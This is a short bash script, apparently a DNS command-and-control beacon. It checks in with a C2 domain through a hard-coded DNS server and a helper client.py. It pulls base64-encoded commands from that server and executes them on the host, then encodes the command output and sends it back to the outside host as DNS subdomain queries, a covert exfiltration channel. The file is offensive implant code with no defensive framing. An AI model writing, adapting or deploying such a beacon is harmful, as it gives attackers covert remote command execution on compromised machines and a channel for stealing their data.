#!/bin/bash
# Beacon to DNS server 

domain="doshcloud.com"
chkdomain="check.doshcloud.com"
dnsServer="129.21.130.212"
f=false
fName=""
output=""

# Pull down commands from server
pull(){

    cmd=$(python client.py -t T $domain)
    first=$(echo $cmd | awk '{print $1}')
    if [[ $first == "file" ]]; then
        f=true
        fName=$(echo $cmd | awk '{print $2}' | base64 --decode)
        echo $fName
    else
        cmd=$(echo $cmd | base64 --decode)
        output=$($cmd)
	return_output
    fi
}

# return output of command back to C2 server
return_output(){
	output=$(echo $output | base64)
	python client.py $output.$domain
}

# Check in with server show beacon is still alive
check(){
    cmd=$(python client.py $chkdomain)
    if [[ $cmd == "1.1.1.1" ]]; then  # means commands are awaiting beacons
        pull
    else
        echo $cmd
    fi
}

# Main driver for beacon
main(){
    check
}

main
